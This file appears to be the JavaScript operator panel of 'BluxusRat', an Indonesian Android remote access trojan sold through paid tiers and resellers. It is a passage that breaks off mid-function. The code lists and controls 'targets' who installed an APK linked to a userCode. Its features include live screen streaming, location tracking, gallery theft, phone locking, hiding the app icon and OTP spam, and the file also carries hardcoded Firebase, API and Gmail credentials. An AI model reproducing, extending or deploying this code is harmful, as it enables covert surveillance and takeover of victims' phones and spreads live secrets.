/* ============================================================
 * BluxusRat V1 [NewEra] — Script (FIXED)
 * Fix: Delete target, icon senter, unlimited target, benefit role
 * ============================================================ */

// ============================================================
// FIREBASE CONFIG
// ============================================================
const firebaseConfig = {
  apiKey: "AIzaSyBx7iNsKzUjiZh-cVnfw3Tl8AYPz_xjH7A",
  authDomain: "ratt-ceee0.firebaseapp.com",
  databaseURL: "https://ratt-ceee0-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "ratt-ceee0",
  storageBucket: "ratt-ceee0.firebasestorage.app",
  messagingSenderId: "767485162301",
  appId: "1:767485162301:web:3800f71fc8c6bb35db8b54",
  measurementId: "G-7LWR6QTLCJ"
};

// ============================================================
// CONFIG
// ============================================================
const CONFIG = {
  FAZZ_KEY: "fcs_live_ff8116a26bea56e04330d6c249a26c3c88e9d4f1",
  FAZZ_API: "https://api.fazzcode.eu.cc/api",
  TERMAI_KEY: "AIzaBj7z2z3xBjsk",
  TERMAI_URL: "https://c.termai.cc",
  ANIME_API: "https://apii.nexadev.my.id/anime",
  ANIME_BANNER: "https://api.nexadev.my.id/api/random/anime",
  MAX_UPLOAD: 2 * 1024 * 1024,
  WA_ADMIN: "6283137236898",
  WA_CHANNEL: "https://whatsapp.com/channel/0029VbD9HztKrWQuuymMCU0w",
  WA_GROUP: "https://chat.whatsapp.com/ImF67mLQSnZ8xYwKpMO4EU"
};

// ============================================================
// GMAIL SMTP — FIXED (App Password 16 karakter)
// ============================================================
const GMAIL = {
  user: "bluxus.order@gmail.com",
  appPassword: "xxbmshqbgzzykpuz",
  fromName: "BluxusRat"
};

async function sendEmail({ to, subject, htmlBody }) {
  return new Promise((resolve, reject) => {
    if (typeof Email === "undefined") {
      return reject(new Error("SMTPJS belum ke-load"));
    }
    const pass = (GMAIL.appPassword || "").replace(/\s/g, "");
    if (!pass || pass.length !== 16) {
      return reject(new Error("App Password Gmail belum di-set (16 karakter)"));
    }
    Email.send({
      Host: "smtp.gmail.com",
      Port: 587,
      Username: GMAIL.user,
      Password: pass,
      To: to,
      From: GMAIL.user,
      Subject: subject,
      Body: htmlBody
    }).then(msg => {
      if (msg && (String(msg).toLowerCase().includes("ok") || String(msg).toLowerCase().includes("success"))) {
        resolve(msg);
      } else {
        reject(new Error(msg || "Gagal kirim email"));
      }
    }).catch(err => reject(err));
  });
}

function buildEmailHTML({ username, password, role, duration, orderId }) {
  return `
    <div style="font-family:'Inter',Arial,sans-serif;background:#0d0709;padding:40px 20px;color:#f5f5f5">
      <div style="max-width:520px;margin:0 auto;background:#160d10;border:1px solid #2a1a1a;border-radius:16px;overflow:hidden">
        <div style="background:linear-gradient(135deg,#c41e28,#8b0000);padding:28px 24px;text-align:center">
          <div style="font-family:'Poppins',Arial,sans-serif;font-size:28px;font-weight:800;letter-spacing:-1px;color:#fff">BluxusRat</div>
          <div style="font-size:10px;letter-spacing:4px;color:#ffffffcc;text-transform:uppercase;margin-top:4px">V1 [NewEra]</div>
        </div>
        <div style="padding:28px 24px">
          <h2 style="font-family:'Poppins',Arial,sans-serif;font-size:18px;color:#fff;margin:0 0 8px 0">Akun Kamu Siap 🎉</h2>
          <p style="font-size:13px;color:#a39599;line-height:1.7;margin:0 0 20px 0">Pesanan kamu udah diverifikasi. Berikut detail akun kamu:</p>
          <div style="background:#0d0709;border:1px solid #2a1a1a;border-radius:12px;padding:18px;margin-bottom:18px">
            <div style="display:flex;justify-content:space-between;padding:6px 0;font-size:12px"><span style="color:#a39599">Username</span><span style="color:#f5f5f5;font-weight:700;font-family:'JetBrains Mono',monospace">${username}</span></div>
            <div style="display:flex;justify-content:space-between;padding:6px 0;font-size:12px"><span style="color:#a39599">Password</span><span style="color:#c41e28;font-weight:700;font-family:'JetBrains Mono',monospace;font-size:14px">${password}</span></div>
            <div style="display:flex;justify-content:space-between;padding:6px 0;font-size:12px"><span style="color:#a39599">Role</span><span style="color:#f5f5f5;font-weight:700">${role}</span></div>
            <div style="display:flex;justify-content:space-between;padding:6px 0;font-size:12px"><span style="color:#a39599">Durasi</span><span style="color:#f5f5f5;font-weight:700">${duration}</span></div>
            <div style="display:flex;justify-content:space-between;padding:6px 0;font-size:12px"><span style="color:#a39599">Order ID</span><span style="color:#f5f5f5;font-weight:700;font-family:'JetBrains Mono',monospace;font-size:11px">${orderId}</span></div>
          </div>
          <div style="background:#ffa50220;border-left:3px solid #ffa502;border-radius:8px;padding:14px;margin-bottom:20px">
            <div style="font-size:12px;color:#ffa502;font-weight:700;margin-bottom:4px">⚠️ Penting</div>
            <div style="font-size:12px;color:#a39599;line-height:1.6">Segera ganti password kamu setelah login pertama untuk keamanan akun.</div>
          </div>
          <p style="font-size:12px;color:#a39599;line-height:1.7;margin:0">Kalau ada pertanyaan, hubungi admin via WhatsApp atau channel komunitas.</p>
        </div>
        <div style="background:#0d0709;padding:18px 24px;border-top:1px solid #2a1a1a;text-align:center">
          <div style="font-size:11px;color:#5a4548">© 2026 BluxusRat — All rights reserved.</div>
        </div>
      </div>
    </div>`;
}

// ============================================================
// ROLE & PRICE DATA — BENEFIT LEBIH MENJUAL
// ============================================================
const PRICE_DATA = {
  member: {
    label: "Member",
    icon: "fa-user",
    color: "member",
    tagline: "Role dasar",
    desc: "Role paling dasar di BluxusRat. Cocok buat yang baru mulai. Bisa akses semua fitur Tools reguler & BluxAnime, plus kontrol device target.",
    benefits: [
      "Akses semua Tools reguler",
      "Akses BluxAnime unlimited",
      "Kontrol device target",
      "Bisa beli tambah sender",
      "Support komunitas",
      "Update fitur rutin",
      "Bisa jual ulang dengan margin sendiri"
    ],
    options: [
      { label: "1 hari", days: 1, price: 2000 },
      { label: "7 hari", days: 7, price: 13000 },
      { label: "30 hari", days: 30, price: 25000 },
      { label: "Unlimited", days: -1, price: 45000 }
    ]
  },
  vip: {
    label: "VIP",
    icon: "fa-crown",
    color: "vip",
    tagline: "Tools tambahan",
    desc: "Role VIP punya akses ke semua fitur Member + VIP Tools (Spam OTP). Cocok buat yang butuh fitur lebih.",
    benefits: [
      "Semua benefit Member",
      "Akses VIP Tools (Spam OTP)",
      "Priority support 24/7",
      "Badge VIP di profil",
      "Limit target 2x lebih banyak",
      "Akses beta fitur baru",
      "Bisa pakai Hide App",
      "Kirim Toast unlimited",
      "Bisa pakai Lock HP",
      "Bisa kirim URL Direct"
    ],
    options: [
      { label: "1 hari", days: 1, price: 3000 },
      { label: "7 hari", days: 7, price: 20000 },
      { label: "30 hari", days: 30, price: 35000 },
      { label: "Unlimited", days: -1, price: 50000 }
    ]
  },
  reseller: {
    label: "Reseller",
    icon: "fa-briefcase",
    color: "reseller",
    tagline: "Bisa bikin akun",
    desc: "Reseller bisa bikin akun Member & VIP untuk dijual ke orang lain. Limit 5 akun/hari. Cocok buat yang mau cari cuan.",
    benefits: [
      "Semua benefit VIP",
      "Bisa bikin akun Member & VIP",
      "Limit 5 akun/hari",
      "Statistics bawahan sendiri",
      "Bisa perpanjang expired bawahan",
      "Akses semua fitur tanpa batas",
      "Support prioritas",
      "Badge Reseller eksklusif",
      "Bisa jual ulang dengan margin sendiri",
      "Bisa kelola order user"
    ],
    options: [
      { label: "7 hari", days: 7, price: 45000 },
      { label: "30 hari", days: 30, price: 80000 },
      { label: "Unlimited", days: -1, price: 150000 }
    ]
  },
  owner: {
    label: "Owner",
    icon: "fa-shield-halved",
    color: "owner",
    tagline: "Kelola sistem",
    desc: "Owner punya akses lebih luas dari Reseller. Bisa broadcast, liat server log, dan add user tanpa limit. Role tertinggi di BluxusRat.",
    benefits: [
      "Semua benefit Reseller",
      "Unlimited bikin akun",
      "Broadcast pengumuman ke semua user",
      "Server logs real-time",
      "Akses maintenance fitur",
      "Bisa reset password user lain",
      "Bisa ban/unban user",
      "Statistics global",
      "Priority support tertinggi",
      "Badge Owner eksklusif",
      "Akses penuh ke semua fitur",
      "Bisa jual role apapun"
    ],
    options: [
      { label: "7 hari", days: 7, price: 85000 },
      { label: "30 hari", days: 30, price: 150000 },
      { label: "Unlimited", days: -1, price: 300000 }
    ]
  },
  dev: {
    label: "Dev",
    icon: "fa-code",
    color: "dev",
    tagline: "Akses penuh",
    desc: "Role Dev adalah role special. Punya akses ke semua fitur + Dev Panel untuk kelola sistem secara keseluruhan.",
    benefits: [
      "Semua benefit Owner",
      "Dev Panel khusus",
      "Akses Ekonomi & Manage Order",
      "Bisa atur maintenance fitur",
      "Akses server logs lengkap",
      "Bisa lihat semua user",
      "Bisa hapus semua data",
      "Bypass semua limit",
      "Akses API internal",
      "Bisa ubah role user lain"
    ],
    options: [
      { label: "Unlimited", days: -1, price: 0 }
    ]
  }
};

const FAQ_DATA = [
  { q: "Apa itu BluxusRat?", a: "BluxusRat adalah control panel untuk monitoring & kontrol device yang terhubung. Bisa liat info device, lokasi, kirim command, dan lain-lain." },
  { q: "Bagaimana cara upgrade role?", a: "Untuk upgrade role, hubungi Owner atau Reseller resmi. Pembayaran & durasi role akan diatur sesuai kesepakatan." },
  { q: "Apa beda VIP sama Member?", a: "VIP punya akses ke VIP Tools (Spam OTP) + fitur advanced seperti Hide App, Lock HP, dan Toast unlimited." },
  { q: "Apa beda Reseller sama VIP?", a: "Reseller bisa bikin akun Member & VIP untuk dijual. VIP cuma bisa pake fitur." },
  { q: "Kenapa akun gw expired?", a: "Masa aktif akun udah lewat. Hubungi Owner/Reseller atau pakai Redeem Code." },
  { q: "Fitur Live Cam kok gak muncul?", a: "Live Cam cuma support Android 11+." },
  { q: "Kenapa target gw gak muncul di Rat?", a: "Target bakal muncul kalo dia install APK dengan userCode yang sesuai." },
  { q: "Apa itu userCode?", a: "UserCode adalah kode unik yang nentuin target mana yang masuk ke akun lo." },
  { q: "Gimana cara hubungi Owner?", a: "Buka halaman About → klik 'Abyy' atau join channel WhatsApp." },
  { q: "Apakah akun bisa dipakai di banyak device?", a: "Bisa, selama login pake username & password yang sama." }
];

const ROLE_PERMS = {
  dev: {
    panel: [
      { id: "add_user", name: "Add User", icon: "fa-user-plus" },
      { id: "manage_user", name: "Manage User", icon: "fa-users-gear" },
      { id: "ban_user", name: "Ban User", icon: "fa-ban" },
      { id: "reset_pw", name: "Reset Password", icon: "fa-key" },
      { id: "broadcast", name: "Broadcast", icon: "fa-bullhorn" },
      { id: "stats", name: "Statistics", icon: "fa-chart-line" },
      { id: "maintenance", name: "Maintenance", icon: "fa-screwdriver-wrench" },
      { id: "logs", name: "Server Logs", icon: "fa-file-lines" }
    ],
    ekonomi: true
  },
  owner: {
    panel: [
      { id: "add_user", name: "Add User", icon: "fa-user-plus" },
      { id: "broadcast", name: "Broadcast", icon: "fa-bullhorn" },
      { id: "logs", name: "Server Logs", icon: "fa-file-lines" }
    ],
    ekonomi: false
  },
  reseller: {
    panel: [
      { id: "add_user", name: "Add User", icon: "fa-user-plus" },
      { id: "extend_user", name: "Extend User", icon: "fa-clock-rotate-left" },
      { id: "stats", name: "Statistics", icon: "fa-chart-line" }
    ],
    ekonomi: false
  },
  vip: { panel: [], ekonomi: false },
  member: { panel: [], ekonomi: false }
};

const CREATE_PERMS = {
  dev: ["owner", "reseller", "vip", "member"],
  owner: ["reseller", "vip", "member"],
  reseller: ["member", "vip"],
  vip: [],
  member: []
};

const DAILY_LIMIT = {
  dev: null,
  owner: null,
  reseller: 5,
  vip: 0,
  member: 0
};

// ============================================================
// STATE
// ============================================================
const State = {
  user: null, uid: null, page: "dash", targets: [],
  unsubLive: null, unsubLoc: null, unsubGallery: null,
  currentTarget: null, currentFeature: null,
  audio: null, currentTrack: null,
  animeSearchMode: false, animeCurrentDetail: null,
  db: null,
  buy: { role: null, days: null, price: null, label: null },
  order: { tab: "pending", search: "", items: [], current: null }
};

const LOADING_TEXTS = [
  "Connecting to Firebase...",
  "Loading assets...",
  "Preparing session...",
  "Almost ready..."
];

const $ = (s, p = document) => p.querySelector(s);
const $$ = (s, p = document) => [...p.querySelectorAll(s)];

let fbRef, fbSet, fbPush, fbUpdate, fbOnValue, fbGet, fbRemove;

// ============================================================
// HAPTIC
// ============================================================
function haptic(ms = 10) {
  try { if (navigator.vibrate) navigator.vibrate(ms); } catch (e) {}
}

// ============================================================
// FIREBASE SDK
// ============================================================
async function loadFirebaseSDK() {
  const appMod = await import("https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js");
  const dbMod = await import("https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js");
  fbRef = dbMod.ref;
  fbSet = dbMod.set;
  fbPush = dbMod.push;
  fbUpdate = dbMod.update;
  fbOnValue = dbMod.onValue;
  fbGet = dbMod.get;
  fbRemove = dbMod.remove;
  const app = appMod.initializeApp(firebaseConfig);
  State.db = dbMod.getDatabase(app);
}

// ============================================================
// UTIL
// ============================================================
function isDev() { return State.user?.role === "dev"; }
function isOwner() { return State.user?.role === "owner"; }
function isReseller() { return State.user?.role === "reseller"; }
function isVIP() { return State.user && ["vip", "reseller", "owner", "dev"].includes(State.user.role); }

function getDeviceName(t) {
  if (!t) return "Unknown Device";
  if (t.brand && t.brand !== "Unknown" && t.brand !== "") {
    return t.brand.charAt(0).toUpperCase() + t.brand.slice(1).toLowerCase();
  }
  if (t.model && t.model !== "Unknown") return t.model;
  return "Unknown Device";
}

function isAndroid11Plus(t) {
  if (!t) return false;
  const sdk = parseInt(t.sdk || "0");
  return sdk >= 30;
}

function showScreen(id) {
  $$(".screen").forEach(s => s.classList.remove("active"));
  const el = $("#screen-" + id);
  if (el) el.classList.add("active");
}

function toast(msg, type = "info", dur = 3000) {
  const wrap = $("#toast-wrap");
  const el = document.createElement("div");
  el.className = "toast " + (type === "info" ? "" : type);
  const ic = type === "ok" ? "fa-circle-check"
           : type === "err" ? "fa-circle-xmark"
           : type === "warn" ? "fa-triangle-exclamation"
           : "fa-circle-info";
  el.innerHTML = `<div class="ico-badge"><i class="fa-solid ${ic}"></i></div><span>${msg}</span>`;
  wrap.appendChild(el);
  setTimeout(() => {
    el.style.opacity = "0";
    el.style.transform = "translateY(-12px) scale(.95)";
    el.style.transition = ".3s";
    setTimeout(() => el.remove(), 300);
  }, dur);
}

function fmtDate(ts) {
  if (!ts) return "—";
  return new Date(ts).toLocaleDateString("id-ID", { day: "2-digit", month: "short", year: "numeric" });
}

function fmtDateTime(ts) {
  if (!ts) return "—";
  const d = new Date(ts);
  return d.toLocaleDateString("id-ID", { day: "2-digit", month: "short", year: "numeric" })
    + " " + d.toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit" });
}

function fmtTime(ts) {
  const d = new Date(ts);
  return `${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}:${String(d.getSeconds()).padStart(2, "0")}`;
}

function timeAgo(ts) {
  if (!ts) return "—";
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return s + "s ago";
  if (s < 3600) return Math.floor(s / 60) + "m ago";
  if (s < 86400) return Math.floor(s / 3600) + "h ago";
  return Math.floor(s / 86400) + "d ago";
}

function fmtSize(bytes) {
  if (!bytes) return "—";
  if (bytes < 1024) return bytes + " B";
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + " KB";
  return (bytes / 1048576).toFixed(2) + " MB";
}

function fmtPrice(n) {
  return "Rp " + n.toLocaleString("id-ID");
}

function cleanTitle(t) {
  if (!t) return "";
  return t.split("\t")[0].trim();
}

async function sha256(text) {
  const buf = new TextEncoder().encode(text);
  const hash = await crypto.subtle.digest("SHA-256", buf);
  return [...new Uint8Array(hash)].map(b => b.toString(16).padStart(2, "0")).join("");
}

function genSalt() {
  const arr = new Uint8Array(16);
  crypto.getRandomValues(arr);
  return [...arr].map(b => b.toString(16).padStart(2, "0")).join("");
}

function genUserCode() {
  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  const gen = () => [...crypto.getRandomValues(new Uint8Array(4))].map(b => chars[b % chars.length]).join("");
  return `${gen()}-${gen()}-${gen()}-${gen()}`;
}

function genOrderId() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  const gen = () => [...crypto.getRandomValues(new Uint8Array(4))].map(b => chars[b % chars.length]).join("");
  return `ORD-${gen()}-${gen()}`;
}

function genPassword(len = 8) {
  const chars = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return [...crypto.getRandomValues(new Uint8Array(len))].map(b => chars[b % chars.length]).join("");
}

async function copyToClipboard(text) {
  try {
    if (navigator.clipboard && window.isSecureContext) {
      await navigator.clipboard.writeText(text);
      return true;
    }
  } catch (e) {}
  try {
    const ta = document.createElement("textarea");
    ta.value = text;
    ta.style.position = "fixed";
    ta.style.left = "-9999px";
    ta.style.top = "0";
    ta.setAttribute("readonly", "");
    document.body.appendChild(ta);
    ta.select();
    ta.setSelectionRange(0, ta.value.length);
    const ok = document.execCommand("copy");
    document.body.removeChild(ta);
    return ok;
  } catch (e) { return false; }
}

// ============================================================
// CONNECTION
// ============================================================
function setDot(s) {
  const d = $("#conn-dot");
  d.classList.remove("warn", "off");
  if (s === "warn") d.classList.add("warn");
  if (s === "off") d.classList.add("off");
}

function showOffline() { $("#offline-popup").classList.add("show"); }
function hideOffline() { $("#offline-popup").classList.remove("show"); }

window.addEventListener("offline", () => { setDot("off"); showOffline(); });
window.addEventListener("online", () => { setDot("ok"); hideOffline(); });

function watchConnection() {
  fbOnValue(fbRef(State.db, ".info/connected"), (snap) => {
    if (snap.val() === true) { setDot("ok"); hideOffline(); }
    else { setDot("warn"); }
  });
  setInterval(() => {
    if (!navigator.onLine) { setDot("off"); showOffline(); }
  }, 3000);
}

// ============================================================
// LOADING
// ============================================================
function runLoading() {
  showScreen("loading");
  const fill = $("#progress-fill");
  const txt = $("#loading-text");
  fill.style.width = "0%";
  let idx = 0;
  txt.textContent = LOADING_TEXTS[0];
  let pct = 0;
  const step = setInterval(() => {
    pct += Math.random() * 12 + 4;
    if (pct >= 100) { pct = 100; clearInterval(step); }
    fill.style.width = pct + "%";
  }, 180);
  const ltxt = setInterval(() => {
    idx = (idx + 1) % LOADING_TEXTS.length;
    txt.style.opacity = "0";
    setTimeout(() => {
      txt.textContent = LOADING_TEXTS[idx];
      txt.style.opacity = "1";
    }, 180);
  }, 800);
  setTimeout(() => {
    clearInterval(ltxt);
    fill.style.width = "100%";
    setTimeout(() => showScreen("login"), 500);
  }, 2400);
}

// ============================================================
// AUTH
// ============================================================
async function doLogin() {
  haptic(15);
  const usn = $("#login-usn").value.trim();
  const pw = $("#login-pw").value;
  if (!usn || !pw) return toast("Isi username & password", "err");
  const btn = $("#btn-login");
  btn.disabled = true;
  btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
  try {
    const snap = await fbGet(fbRef(State.db, "users"));
    if (!snap.exists()) throw new Error("Belum ada user terdaftar");
    const users = snap.val();
    let foundUid = null, foundUser = null;
    for (const uid in users) {
      if (users[uid].username === usn) { foundUid = uid; foundUser = users[uid]; break; }
    }
    if (!foundUser) throw new Error("Username tidak ditemukan");
    if (foundUser.banned) throw new Error("Akun di-ban");
    const hash = await sha256(pw + foundUser.passwordSalt);
    if (hash !== foundUser.passwordHash) throw new Error("Password salah");
    if (foundUser.expiresAt && foundUser.expiresAt < Date.now()) throw new Error("Akun expired");
    await fbUpdate(fbRef(State.db, "users/" + foundUid), { lastLogin: Date.now() });
    State.uid = foundUid;
    State.user = foundUser;
    localStorage.setItem("bluxus_uid", foundUid);
    toast("Login berhasil", "ok");
    setTimeout(() => goDashboard(), 400);
  } catch (e) {
    toast(e.message || "Login gagal", "err");
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fa-solid fa-right-to-bracket"></i> Login';
  }
}

async function tryResume() {
  const uid = localStorage.getItem("bluxus_uid");
  if (!uid) return false;
  try {
    const snap = await fbGet(fbRef(State.db, "users/" + uid));
    if (!snap.exists()) return false;
    const u = snap.val();
    if (u.banned) return false;
    if (u.expiresAt && u.expiresAt < Date.now()) return false;
    State.uid = uid;
    State.user = u;
    return true;
  } catch (e) { return false; }
}

// ============================================================
// DASHBOARD
// ============================================================
async function goDashboard() {
  showScreen("dash");
  const u = State.user || {};
  $("#dash-usn").textContent = u.username || "—";
  const role = u.role || "member";
  const roleEl = $("#dash-role");
  roleEl.className = "role " + role;
  roleEl.innerHTML = `<i class="fa-solid fa-user"></i> ${role}`;
  $("#dash-usercode").textContent = u.userCode || "—";
  $("#dash-welcome-name").textContent = u.username || "User";
  const badge = $("#dash-badge");
  badge.textContent = role.toUpperCase();
  badge.className = "wb-badge " + role;
  $("#sb-sub").textContent = u.username || "—";

  if (["dev", "owner", "reseller"].includes(role)) {
    $("#sb-role-sep").classList.remove("hidden");
    $("#sb-panel").classList.remove("hidden");
  } else {
    $("#sb-role-sep").classList.add("hidden");
    $("#sb-panel").classList.add("hidden");
  }
  if (role === "dev") {
    $("#sb-ekonomi").classList.remove("hidden");
  } else {
    $("#sb-ekonomi").classList.add("hidden");
  }
  markSidebar("dash");
  await loadTargets();
  loadAnnouncement();
}

function markSidebar(page) {
  $$(".sb-item").forEach(el => el.classList.toggle("active", el.dataset.page === page));
}

function openSidebar() {
  haptic(8);
  $("#sidebar").classList.add("open");
  $("#sidebar-backdrop").classList.add("show");
}

function closeSidebar() {
  $("#sidebar").classList.remove("open");
  $("#sidebar-backdrop").classList.remove("show");
}

function goPage(page) {
  haptic(8);
  closeSidebar();
  markSidebar(page);
  State.page = page;
  if (page === "dash") return goDashboard();
  if (page === "rat") return goRat();
  if (page === "anime") return goAnime();
  if (page === "tools") return goTools();
  if (page === "benefit") return goBenefit();
  if (page === "account") return goAccount();
  if (page === "about") return showScreen("about");
  if (page === "panel") return goPanel();
  if (page === "ekonomi") return goEkonomi();
}

// ============================================================
// ANNOUNCEMENT
// ============================================================
async function loadAnnouncement() {
  const wrap = $("#announce-wrap");
  if (!wrap) return;
  try {
    const snap = await fbGet(fbRef(State.db, "broadcasts"));
    if (!snap.exists()) { wrap.innerHTML = ""; return; }
    const arr = Object.entries(snap.val())
      .map(([id, v]) => ({ id, ...v }))
      .sort((a, b) => b.createdAt - a.createdAt);
    const l = arr[0];
    if (!l) { wrap.innerHTML = ""; return; }
    wrap.innerHTML = `
      <div class="announce-card" id="announce-card">
        ${l.image ? `<img src="${l.image}" onerror="this.style.display='none'">` : ""}
        <div class="ac-body">
          <div class="ac-label"><i class="fa-solid fa-bullhorn"></i> Pengumuman</div>
          <div class="ac-title">${l.title || "Info Terbaru"}</div>
          <div class="ac-desc">${l.message || ""}</div>
        </div>
      </div>`;
    $("#announce-card").onclick = () => {
      haptic(8);
      if (l.url) { window.open(l.url, "_blank"); return; }
      openAnnouncementModal(l);
    };
  } catch (e) {}
}

function openAnnouncementModal(b) {
  const box = $("#modal-box");
  box.innerHTML = `
    ${b.image ? `<div style="border-radius:14px;overflow:hidden;margin:-8px -8px 16px"><img src="${b.image}" style="width:100%;display:block" onerror="this.style.display='none'"></div>` : ""}
    <h3>${b.title || "Pengumuman"}</h3>
    <div class="sub">${fmtDateTime(b.createdAt)}</div>
    <div style="font-size:13px;color:var(--text);line-height:1.7;white-space:pre-wrap">${b.message || ""}</div>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
}

// ============================================================
// TARGETS / RAT — FIX UNLIMITED
// ============================================================
async function loadTargets() {
  try {
    const snap = await fbGet(fbRef(State.db, "targets"));
    const all = snap.exists() ? snap.val() : {};
    const myCode = State.user.userCode;
    State.targets = [];
    for (const tid in all) {
      const t = all[tid];
      // FIX: tampilkan semua target yang ownerCode-nya cocok
      if (t.ownerCode === myCode) {
        State.targets.push({ id: tid, ...t });
      }
    }
    // Sort by last seen (terbaru di atas)
    State.targets.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
    
    $("#dash-targets").textContent = State.targets.length;
    $("#dash-online").textContent = State.targets.filter(t => t.status === "online").length;
    renderTargetList();
  } catch (e) {
    console.error("[loadTargets]", e);
  }
}

function renderTargetList() {
  const list = $("#target-list");
  if (!list) return;
  if (State.targets.length === 0) {
    list.innerHTML = `
      <div style="text-align:center;padding:30px 20px;color:var(--text-dim)">
        <i class="fa-solid fa-satellite-dish" style="font-size:42px;display:block;margin-bottom:12px;opacity:.3"></i>
        <div style="font-size:12px">Belum ada target</div>
        <div style="font-size:10px;color:var(--text-mute);margin-top:4px">Kirim APK ke target buat mulai</div>
      </div>`;
    return;
  }
  list.innerHTML = State.targets.map(t => {
    const online = t.status === "online";
    const bat = t.battery || 0;
    const low = bat < 20;
    const batIcon = bat > 75 ? "full" : bat > 50 ? "three-quarters" : bat > 25 ? "half" : "quarter";
    const deviceName = getDeviceName(t);
    return `
      <div class="target-item" data-tid="${t.id}">
        <div class="ti-avatar"><i class="fa-solid fa-mobile-screen"></i></div>
        <div class="ti-info">
          <div class="n">${deviceName}</div>
          <div class="d">
            <span>${t.ip || "—"}</span>
            ${t.battery ? `<span class="battery-badge ${low ? "low" : ""}"><i class="fa-solid fa-battery-${batIcon}"></i>${bat}%</span>` : ""}
            <span>${timeAgo(t.lastSeen)}</span>
          </div>
        </div>
        <div class="ti-status ${online ? "on" : "off"}"><span class="d"></span>${online ? "ON" : "OFF"}</div>
      </div>`;
  }).join("");
  $$(".target-item").forEach(el => el.onclick = () => {
    haptic(10);
    openTargetDetail(el.dataset.tid);
  });
}

function goRat() {
  showScreen("rat");
  const uc = $("#rat-usercode");
  uc.textContent = State.user.userCode || "—";
  const btn = $("#btn-copy-usercode");
  btn.classList.remove("copied");
  btn.innerHTML = '<i class="fa-solid fa-copy"></i>';
  loadTargets();
}

// ============================================================
// TARGET DETAIL — FIX ICON SENTER
// ============================================================
const FEATURES = [
  { id: "info", icon: "fa-mobile-screen-button", name: "Info Device", desc: "Detail device target", page: "fp-info" },
  { id: "live", icon: "fa-desktop", name: "Live Cam", desc: "Stream layar target", page: "fp-live" },
  { id: "locate", icon: "fa-location-dot", name: "Locate", desc: "Lokasi target", page: "fp-locate" },
  { id: "flash", icon: "fa-lightbulb", name: "Senter & Strobo", desc: "Kontrol flashlight", page: "fp-flash" },
  { id: "lock", icon: "fa-lock", name: "Kunci HP", desc: "Lock overlay target", page: "fp-lock" },
  { id: "volume", icon: "fa-volume-high", name: "Set Volume", desc: "Atur volume target", page: "fp-volume" },
  { id: "brightness", icon: "fa-sun", name: "Set Kecerahan", desc: "Atur brightness", page: "fp-brightness" },
  { id: "url", icon: "fa-link", name: "URL Direct", desc: "Buka URL di target", page: "fp-url" },
  { id: "gallery", icon: "fa-images", name: "Get Gallery", desc: "Ambil foto target", page: "fp-gallery" },
  { id: "toast", icon: "fa-comment-dots", name: "Kirim Toast", desc: "Tampilkan pesan di target", page: "fp-toast" },
  { id: "hideapp", icon: "fa-eye-slash", name: "Hide App", desc: "Sembunyikan icon APK", page: "fp-hideapp" }
];

function openTargetDetail(tid) {
  const t = State.targets.find(x => x.id === tid);
  if (!t) return;
  State.currentTarget = t;
  State.currentFeature = null;
  const deviceName = getDeviceName(t);
  $("#target-title").textContent = deviceName;
  showScreen("target");
  renderFeatureGrid(t);
  closeAllFeaturePages();
}

function renderFeatureGrid(t) {
  const grid = $("#feature-grid");
  grid.innerHTML = FEATURES.map(f => {
    let disabled = false;
    if (f.id === "live" && !isAndroid11Plus(t)) disabled = true;
    return `
      <div class="feature-card ${disabled ? "disabled" : ""}" data-fid="${f.id}">
        <div class="fc-icon"><i class="fa-solid ${f.icon}"></i></div>
        <div class="fc-name">${f.name}</div>
        <div class="fc-desc">${f.desc}${disabled ? " (Android 11+)" : ""}</div>
      </div>`;
  }).join("") + `
    <div class="feature-card danger" data-fid="delete">
      <div class="fc-icon"><i class="fa-solid fa-trash"></i></div>
      <div class="fc-name">Hapus Target</div>
      <div class="fc-desc">Hapus target & semua data</div>
    </div>`;

  $$(".feature-card", grid).forEach(el => {
    el.onclick = () => {
      haptic(10);
      const fid = el.dataset.fid;
      if (fid === "delete") return confirmDeleteTarget(t);
      if (el.classList.contains("disabled")) return toast("Fitur ini gak tersedia di perangkat target", "warn");
      openFeaturePage(fid, t);
    };
  });
}

function openFeaturePage(fid, t) {
  State.currentFeature = fid;
  closeAllFeaturePages();
  const feat = FEATURES.find(f => f.id === fid);
  if (!feat) return;
  $("#feature-grid").style.display = "none";
  const page = $("#" + feat.page);
  if (!page) return;
  page.classList.add("active");

  if (fid === "info") renderInfoPage(t);
  if (fid === "live") renderLivePage(t);
  if (fid === "locate") renderLocatePage(t);
  if (fid === "flash") setupFlashToggles(t);
  if (fid === "lock") setupLockPage(t);
  if (fid === "volume") setupVolumePage(t);
  if (fid === "brightness") setupBrightnessPage(t);
  if (fid === "url") setupUrlPage(t);
  if (fid === "gallery") setupGalleryPage(t);
  if (fid === "toast") setupToastPage(t);
  if (fid === "hideapp") setupHideAppPage(t);
}

function closeAllFeaturePages() {
  $$(".feature-page").forEach(p => p.classList.remove("active"));
  $("#feature-grid").style.display = "grid";
}

// ============================================================
// CONFIRM DELETE TARGET — FIX
// ============================================================
function confirmDeleteTarget(t) {
  const deviceName = getDeviceName(t);
  const box = $("#modal-box");
  box.innerHTML = `
    <h3 style="color:var(--error)">Hapus Target?</h3>
    <div class="sub">Target: <b>${deviceName}</b></div>
    <div class="buy-note" style="margin-top:14px;background:var(--error-soft);border-color:rgba(255,51,51,0.3)">
      <i class="fa-solid fa-triangle-exclamation" style="color:var(--error)"></i>
      <span>Semua data (commands, live, locations, gallery) akan dihapus permanen. Tidak bisa dikembalikan.</span>
    </div>
    <div class="modal-actions">
      <button class="btn btn-ghost" id="btn-cancel-delete">Batal</button>
